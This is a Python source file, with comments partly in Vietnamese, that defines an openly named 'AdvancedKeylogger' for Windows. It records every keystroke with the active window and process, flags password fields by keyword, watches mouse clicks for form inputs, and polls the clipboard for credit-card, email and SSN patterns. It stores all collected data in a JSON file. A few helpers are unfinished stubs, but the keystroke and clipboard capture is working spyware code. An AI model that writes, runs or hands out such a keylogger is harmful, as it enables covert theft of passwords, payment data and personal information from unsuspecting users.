import os
import time
import json
import re
import threading
import win32clipboard
import win32gui
import win32process
import win32api
import win32con
from typing import Dict, List, Set, Optional
from datetime import datetime
from pynput import keyboard, mouse
from dataclasses import dataclass, field

@dataclass
class KeyStroke:
    """Thông tin về một keystroke"""
    key: str
    timestamp: float
    window_title: str
    process_name: str
    is_password: bool = False
    context: str = ''

@dataclass
class FormInput:
    """Thông tin về form input được phát hiện"""
    field_type: str  # password, text, email, etc
    field_name: str
    value: str
    url: str
    timestamp: float

class AdvancedKeylogger:
    """Keylogger với các tính năng nâng cao"""

    def __init__(self):
        self.keystrokes: List[KeyStroke] = []
        self.clipboard_data: List[Dict] = []
        self.form_inputs: List[FormInput] = []
        self.password_patterns: Set[str] = {
            'password', 'pass', 'pwd', 'secret', 'login', 'auth'
        }
        self.sensitive_patterns: Set[str] = {
            r'\b\d{16}\b',  # Credit card
            r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email
            r'\b\d{3}-\d{2}-\d{4}\b',  # SSN
        }
        self.running = False
        self.last_window = ''
        self.current_context = ''
        
        # Keystroke pattern analysis
        self.pattern_buffer: List[KeyStroke] = []
        self.pattern_interval = 0.5  # seconds
        
        # Threading
        self.keyboard_thread = None
        self.mouse_thread = None
        self.clipboard_thread = None
        
    def start(self):
        """Start monitoring"""
        self.running = True
        
        # Start keyboard listener
        self.keyboard_thread = threading.Thread(target=self._monitor_keyboard)
        self.keyboard_thread.daemon = True
        self.keyboard_thread.start()
        
        # Start mouse listener
        self.mouse_thread = threading.Thread(target=self._monitor_mouse)
        self.mouse_thread.daemon = True
        self.mouse_thread.start()
        
        # Start clipboard monitor
        self.clipboard_thread = threading.Thread(target=self._monitor_clipboard)
        self.clipboard_thread.daemon = True
        self.clipboard_thread.start()
        
    def stop(self):
        """Stop monitoring"""
        self.running = False
        if self.keyboard_thread:
            self.keyboard_thread.join()
        if self.mouse_thread:
            self.mouse_thread.join()
        if self.clipboard_thread:
            self.clipboard_thread.join()
            
    def _get_window_info(self) -> tuple:
        """Get thông tin về window hiện tại"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | 
                                        win32con.PROCESS_VM_READ, False, pid)
            process_name = win32process.GetModuleFileNameEx(process, 0)
            window_title = win32gui.GetWindowText(hwnd)
            process.close()
            return process_name, window_title
        except Exception:
            return "Unknown", "Unknown"
            
    def _is_password_field(self, context: str) -> bool:
        """Check if current context là password field"""
        return any(p.lower() in context.lower() for p in self.password_patterns)
        
    def _monitor_keyboard(self):
        """Monitor keyboard events"""
        def on_press(key):
            if not self.running:
                return False
                
            try:
                process_name, window_title = self._get_window_info()
                
                # Update context nếu window thay đổi
                if window_title != self.last_window:
                    self.current_context = window_title
                    self.last_window = window_title
                
                # Create keystroke
                k = KeyStroke(
                    key=str(key),
                    timestamp=time.time(),
                    window_title=window_title,
                    process_name=process_name,
                    is_password=self._is_password_field(self.current_context),
                    context=self.current_context
                )
                
                self.keystrokes.append(k)
                self.pattern_buffer.append(k)
                
                # Analyze pattern buffer
                self._analyze_patterns()
                
            except Exception:
                pass
                
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
            
    def _monitor_mouse(self):
        """Monitor mouse events để detect form inputs"""
        def on_click(x, y, button, pressed):
            if not self.running:
                return False
                
            try:
                if pressed:
                    process_name, window_title = self._get_window_info()
                    
                    # Check if clicked element là form input
                    element_info = self._get_element_info(x, y)
                    if element_info and element_info.get('tag') == 'input':
                        input_type = element_info.get('type', 'text')
                        name = element_info.get('name', '')
                        url = self._get_url_from_title(window_title)
                        
                        # Monitor value changes
                        if input_type == 'password':
                            self.current_context = f'password_{name}'
                        else:
                            self.current_context = f'{input_type}_{name}'
                            
                        self.form_inputs.append(FormInput(
                            field_type=input_type,
                            field_name=name,
                            value='',  # Will be updated by keyboard events
                            url=url,
                            timestamp=time.time()
                        ))
                        
            except Exception:
                pass
                
        with mouse.Listener(on_click=on_click) as listener:
            listener.join()
            
    def _monitor_clipboard(self):
        """Monitor clipboard changes"""
        last_content = ''
        
        while self.running:
            try:
                win32clipboard.OpenClipboard()
                if win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT):
                    content = win32clipboard.GetClipboardData(win32con.CF_TEXT)
                    if content and content != last_content:
                        # Check for sensitive data
                        is_sensitive = False
                        matched_pattern = None
                        
                        for pattern in self.sensitive_patterns:
                            if re.search(pattern, content):
                                is_sensitive = True
                                matched_pattern = pattern
                                break
                                
                        self.clipboard_data.append({
                            'content': content,
                            'timestamp': time.time(),
                            'is_sensitive': is_sensitive,
                            'pattern': matched_pattern
                        })
                        
                        last_content = content
                        
                win32clipboard.CloseClipboard()
                
            except Exception:
                pass
                
            time.sleep(0.1)  # Prevent high CPU usage
            
    def _analyze_patterns(self):
        """Analyze keystroke patterns"""
        if not self.pattern_buffer:
            return
            
        # Check time window
        now = time.time()
        while self.pattern_buffer and \
              now - self.pattern_buffer[0].timestamp > self.pattern_interval:
            self.pattern_buffer.pop(0)
            
        if len(self.pattern_buffer) < 2:
            return
            
        # Calculate timing patterns
        intervals = []
        for i in range(1, len(self.pattern_buffer)):
            interval = self.pattern_buffer[i].timestamp - \
                      self.pattern_buffer[i-1].timestamp
            intervals.append(interval)
            
        # Detect patterns như repeated keys, timing consistency
        repeated = self._detect_repeated_keys()
        consistent_timing = self._check_timing_consistency(intervals)
        
        if repeated or consistent_timing:
            pattern = {
                'timestamp': time.time(),
                'window': self.last_window,
                'repeated_keys': repeated,
                'consistent_timing': consistent_timing,
                'avg_interval': sum(intervals) / len(intervals)
            }
            
            # TODO: Log pattern for analysis
            
    def _detect_repeated_keys(self) -> Optional[Dict]:
        """Detect repeated key patterns"""
        if len(self.pattern_buffer) < 3:
            return None
            
        # Convert to key sequence
        keys = [k.key for k in self.pattern_buffer]
        
        # Check for repeating subsequences
        for length in range(2, len(keys)//2 + 1):
            for i in range(len(keys) - 2*length + 1):
                if keys[i:i+length] == keys[i+length:i+2*length]:
                    return {
                        'sequence': keys[i:i+length],
                        'position': i,
                        'length': length
                    }
                    
        return None
        
    def _check_timing_consistency(self, intervals: List[float]) -> bool:
        """Check for consistent typing patterns"""
        if len(intervals) < 3:
            return False
            
        # Calculate standard deviation
        mean = sum(intervals) / len(intervals)
        variance = sum((x - mean) ** 2 for x in intervals) / len(intervals)
        std_dev = variance ** 0.5
        
        # Check if timing is consistent (low standard deviation)
        return std_dev < 0.1 * mean
        
    def _get_element_info(self, x: int, y: int) -> Optional[Dict]:
        """Get thông tin về element tại vị trí x,y"""
        # TODO: Implement using UI Automation
        return None
        
    def _get_url_from_title(self, title: str) -> str:
        """Extract URL từ window title"""
        # Common browser title patterns
        patterns = [
            r'https?://[^\s]+',
            r'(?:[\w-]+\.)+[\w-]+(?:/[^\s]*)?'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, title)
            if match:
                return match.group(0)
                
        return ''
        
    def get_collected_data(self) -> Dict:
        """Return collected data"""
        return {
            'keystrokes': [vars(k) for k in self.keystrokes],
            'form_inputs': [vars(f) for f in self.form_inputs],
            'clipboard': self.clipboard_data
        }
        
    def save_data(self, output_file: str):
        """Save collected data to file"""
        data = self.get_collected_data()
        try:
            with open(output_file, 'w') as f:
                json.dump(data, f, indent=2, default=str)
        except Exception:
            pass